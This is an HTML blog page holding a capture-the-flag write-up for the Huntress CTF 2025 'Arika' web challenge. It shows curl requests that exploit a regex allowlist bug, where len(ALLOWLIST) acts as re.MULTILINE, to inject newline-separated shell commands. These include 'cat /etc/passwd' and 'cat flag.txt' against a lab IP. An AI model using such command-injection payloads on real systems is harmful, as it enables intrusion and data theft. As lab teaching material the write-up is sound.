@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>Huntress CTF 2025 - Arika</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Huntress CTF 2025 - Arika | Writeups</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Huntress CTF 2025 - Arika" />
+<meta name="author" content="alphaz3r0" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Challenge Description" />
+<meta property="og:description" content="Challenge Description" />
+<link rel="canonical" href="http://localhost:4000/writeup/web/Arika" />
+<meta property="og:url" content="http://localhost:4000/writeup/web/Arika" />
+<meta property="og:site_name" content="Writeups" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-11-01T00:00:00+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Huntress CTF 2025 - Arika" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"alphaz3r0","url":"0x41414141-code.github.io"},"dateModified":"2025-11-01T00:00:00+01:00","datePublished":"2025-11-01T00:00:00+01:00","description":"Challenge Description","headline":"Huntress CTF 2025 - Arika","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/writeup/web/Arika"},"url":"http://localhost:4000/writeup/web/Arika"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    <h1>alphaz3r0@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/CTF"><h2 class="header-link">Huntress</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>Huntress CTF 2025 - Arika</h2>
+  <time datetime="2025-11-01T00:00:00+01:00" class="by-line">01 Nov 2025</time>
+  <h2 id="challenge-description">Challenge Description</h2>
+
+<p>The Arika ransomware group likes to look slick and spiffy with their cool green-on-black terminal style website… but it sounds like they are worried about some security concerns of their own!</p>
+
+<h2 id="initial-reconnaissance">Initial Reconnaissance</h2>
+
+<p>When first approaching the Arika website, I encountered a terminal-style interface with a limited set of allowed commands: <code class="language-plaintext highlighter-rouge">leaks</code>, <code class="language-plaintext highlighter-rouge">news</code>, <code class="language-plaintext highlighter-rouge">contact</code>, <code class="language-plaintext highlighter-rouge">help</code>, <code class="language-plaintext highlighter-rouge">whoami</code>, <code class="language-plaintext highlighter-rouge">date</code>, <code class="language-plaintext highlighter-rouge">hostname</code>, and <code class="language-plaintext highlighter-rouge">clear</code>.</p>
+
+<p>I started by testing the basic functionality:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-X</span> POST http://10.1.180.56/ <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-d</span> <span class="s1">'{"command":"help"}'</span> | jq <span class="nb">.</span>
+</code></pre></div></div>
+
+<p>The response confirmed the application was working and showed the allowlist. My initial thought was to try classic command injection techniques:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Attempt 1: Semicolon injection</span>
+curl <span class="nt">-s</span> <span class="nt">-X</span> POST http://10.1.180.56/ <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-d</span> <span class="s1">'{"command":"help; ls"}'</span> | jq <span class="nb">.</span>
+
+<span class="c"># Attempt 2: Pipe injection  </span>
+curl <span class="nt">-s</span> <span class="nt">-X</span> POST http://10.1.180.56/ <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-d</span> <span class="s1">'{"command":"leaks &amp;&amp; cat /etc/passwd"}'</span> | jq <span class="nb">.</span>
+</code></pre></div></div>
+
+<p><strong>Result</strong>: All attempts failed with “Run ‘help’ to see valid commands” error. The allowlist seemed robust at first glance.</p>
+
+<p>Examining the provided <code class="language-plaintext highlighter-rouge">app.py</code> revealed the vulnerability:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="ow">not</span> <span class="nb">any</span><span class="p">([</span> <span class="n">re</span><span class="p">.</span><span class="n">match</span><span class="p">(</span><span class="sa">r</span><span class="s">"^%s$"</span> <span class="o">%</span> <span class="n">allowed</span><span class="p">,</span> <span class="n">command</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">ALLOWLIST</span><span class="p">))</span> <span class="k">for</span> <span class="n">allowed</span> <span class="ow">in</span> <span class="n">ALLOWLIST</span><span class="p">]):</span>
+</code></pre></div></div>
+
+<p>The critical insight was recognizing that <code class="language-plaintext highlighter-rouge">len(ALLOWLIST)</code> equals 8, which corresponds to <code class="language-plaintext highlighter-rouge">re.MULTILINE</code> flag in Python’s regex module. This changed everything!</p>
+
+<h3 id="understanding-the-multiline-flag-impact">Understanding the MULTILINE Flag Impact</h3>
+
+<p>With <code class="language-plaintext highlighter-rouge">re.MULTILINE</code>:</p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">^</code> matches start of <strong>any line</strong> (not just start of string)</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">$</code> matches end of <strong>any line</strong> (not just end of string)</p>
+  </li>
+</ul>
+
+<p>This meant the pattern <code class="language-plaintext highlighter-rouge">^help$</code> would match if “help” appeared as a complete line anywhere in the input, not just as the entire input.</p>
+
+<h3 id="proof-of-concept">Proof of Concept</h3>
+
+<p>I tested the newline injection theory:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-X</span> POST http://10.1.180.56/ <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-d</span> <span class="s1">'{"command":"leaks\nls"}'</span> | jq <span class="nb">.</span>
+</code></pre></div></div>
+
+<p><strong>Success!</strong> The response showed both the leaks output AND a directory listing, confirming command injection was possible.</p>
+
+<p>And we see the flag also so just by running:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-X</span> POST http://10.1.180.56/ <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-d</span> <span class="s1">'{"command":"help\ncat flag.txt"}'</span> | jq <span class="nb">.</span>
+</code></pre></div></div>
+
+<p>We get the flag</p>
+
+<p>Response:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
+  "code": 0,
+  "ok": true,
+  "stderr": "",
+  "stdout": "List of all commands:\n leaks      — hacked companies\n news       — news about upcoming data releases\n contact    — send us a message and we will contact you\n help       — available commands\n clear      — clear screen\nflag{eaec346846596f7976da7e1adb1f326d}\n"
+}
+</code></pre></div></div>
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   
+
+  
+</body>
+
+</html>
